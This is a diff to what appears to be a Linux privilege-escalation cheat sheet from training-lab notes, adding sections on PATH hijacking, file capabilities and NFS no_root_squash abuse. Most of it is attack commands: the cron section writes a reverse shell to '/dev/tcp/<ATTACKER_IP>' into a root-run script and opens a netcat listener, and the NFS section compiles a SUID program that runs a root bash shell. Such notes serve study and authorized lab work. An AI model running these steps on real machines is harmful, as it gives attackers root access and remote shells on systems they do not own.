@@ -34,15 +34,29 @@ Writable /etc/passwd:
                 password hash between the first and second colon (replacing the "x").
   su root
 
+PATH:
+  echo $PATH    If a folder for which your user has write permission is located in the path, you could 
+                potentially hijack an application to run a script.
+  find / -writable 2>/dev/null | grep home
+                 Search for writable folders
+                 If any writable folder is listed under PATH we could create a binary
+                 named thm under that directory and have our “path” script run it
+  export PATH=/tmp:$PATH
+                 If the folder we want to write to is not in PATH, we can just add it
+
+
 Cron Jobs - File Permissions:
   cat /etc/crontab
                 View the contents of the system-wide crontab.
   locate script.sh
+                If there is a scheduled task that runs with root privileges and we
+                can change the script that will be run, then our script will run
+                with root privileges.
                 Locate the full path of the script
   ls -l /usr/local/bin/script.sh
-                Check if that the file is world-writable
+                Check if that the file is word-writable
   echo '#!/bin/bash
-  bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1' > /usr/loca/bin/script.sh
+  bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1' > /usr/local/bin/script.sh
                 Replace the contents of the script.sh file with the following after changing the IP address
   nc -nvlp 4444
                 Set up a netcat listener on attacker machine and wait for the cron job to run
@@ -60,6 +74,43 @@ Cron Jobs - PATH Environment Variable:
                 Wait for the cron job to run and Run the /tmp/rootbash command with
                 -p to gain a shell running with root privileges
 
+Capabilities:
+  getcap -r / 2>/dev/null
+                List binaries that have set capabilities
+                Capabilities help manage privileges at a more granular level. 
+                For example, if the SOC analyst needs to use a tool that needs to
+                initiate socket connections, a regular user would not be able to do
+                that. If the system administrator does not want to give this user 
+                higher privileges, they can change the capabilities of the binary
+                GTFObins has a good list of binaries that can be leveraged for privilege
+                escalation if we find any set capabilities.
+
+NFS:
+  cat /etc/exports
+                If NFS configuration is misconfigured is kept in the /etc/exports file
+                and the option no_root_squash is present on a writable share, we can create
+                an executable with SUID bit set and run it on the target system.
+  showmount -e IP_ADDRESS
+                Enumerating mountable shares from our attacking machine
+  mkdir /tmp/sharedfolder
+  sudo mount -o rw IP_ADDR:/home/ubuntu/sharedfolder /tmp/sharedfolder
+                Mount one of the “no_root_squash” shares to our attacking machine and start 
+                building our executable. 
+echo 'int main()
+{
+   setgid(0);
+   setuid(0);
+   system("/bin/bash");
+   return 0;
+}' > nfs.c
+                 As we can set SUID bits, a simple executable that will run /bin/bash
+                 on the target system will do the job. 
+  gcc nfs.c -o nfs -w
+                 Once we compile the code we will set the SUID bit
+  chmod +s nfs
+  ./nfs          On the target system get root priveleges
+  id
+
 
 Potential Privesc vectors to look out:
   Service Exploits
@@ -69,5 +120,4 @@ Potential Privesc vectors to look out:
   Passwords & Keys - History Files
   Passwords & Keys - Config Files
   Passwords & Keys - SSH Keys
-  NFS
   PrivEsc Scripts
